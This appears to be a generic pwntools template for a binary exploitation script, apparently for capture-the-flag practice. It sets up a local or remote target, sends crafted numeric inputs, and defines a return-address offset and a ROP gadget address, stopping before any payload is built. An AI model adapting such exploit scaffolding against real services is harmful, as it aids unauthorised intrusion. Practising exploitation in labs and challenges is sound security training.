#!/usr/bin/python3
# pwntools template binary exploit script

from pwn import *

TIMEOUT = 1 # global timeout value, alter if payload chunking or waiting for leak output

exe = './binaryname' # set binary name to reuse
context.binary = exe

# test exploit locally
p = process(exe)
libc = ELF('./libc.self')

# connect to remote server
#p = remote('1.2.3.4', 31337)
#libc = ELF('./libc.so.6') # leaked libc version from server

elf = ELF(exe)

p.recv(timeout=TIMEOUT)
p.sendline('-65338 -1')
p.recvuntil('>')
p.sendline('3')

#offset of return address
RET_OFFSET = 40

POP_RDI = 0x00000000004011d3 # for ropchains, find addresses of pop RDI, RSI, r9 as needed for params
